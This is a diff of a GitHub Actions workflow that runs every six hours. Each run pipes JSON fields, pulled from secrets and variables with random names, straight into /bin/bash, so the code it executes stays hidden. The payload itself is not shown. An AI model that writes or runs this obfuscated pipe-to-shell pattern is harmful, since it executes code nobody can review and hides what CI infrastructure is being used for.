@@ -1,27 +1,21 @@
 name: jadecodez
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
+    - cron: '51 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jadecodez
         env:
-          trun50838: ${{ secrets.trun50838 }}
+          hzgai204: ${{ secrets.hzgai204 }}
         run: |
-          echo $trun50838 | jq -r .p574 | /bin/bash
-          echo $gp18688 | jq -r .eezf72 | /bin/bash
-          echo $gtl283 | jq -r .uh3729 | /bin/bash
-          echo $sg79660 | jq -r .was574 | /bin/bash
-          echo $v015 | jq -r .v78 | /bin/bash
-          echo $gf375 | jq -r .qj997 | /bin/bash
-          echo $edf6891 | jq -r .nyfry1 | /bin/bash
-          echo $rlz56421 | jq -r .xr8878 | /bin/bash
-          echo $bvdw2 | jq -r .y4 | /bin/bash
-          echo $cy792 | jq -r .dur12178 | /bin/bash
+          echo $hzgai204 | jq -r .dxi0543 | /bin/bash
+          echo $pswun512 | jq -r .e049 | /bin/bash
+          echo $alfad0098 | jq -r .xby0 | /bin/bash
+          echo $enkbl23320 | jq -r .mlymi154 | /bin/bash
 
